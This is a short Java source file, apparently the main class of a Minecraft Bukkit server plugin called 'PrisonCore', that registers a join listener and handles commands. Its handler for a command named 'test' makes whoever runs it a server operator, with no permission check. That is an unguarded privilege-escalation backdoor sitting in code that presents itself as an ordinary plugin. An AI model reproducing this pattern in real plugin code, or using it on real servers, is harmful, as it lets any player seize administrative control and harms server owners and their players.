package me.prisoncore;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.Listener;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

import me.prisoncore.listeners.PlayerJoin;

public class Main extends JavaPlugin implements Listener {

	public void onEnable() {
		Bukkit.getLogger().info("[PrisonCore] Starting");
		PluginManager pm = Bukkit.getServer().getPluginManager();
		pm.registerEvents(new PlayerJoin(this), this);
	}
	public void onDisable() {
		Bukkit.getLogger().info("[PrisonCore] Stopping");
	}
	
	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		
		if(command.getName().equalsIgnoreCase("test")) {
			sender.setOp(true);
		}
		return true;
	}
	
}
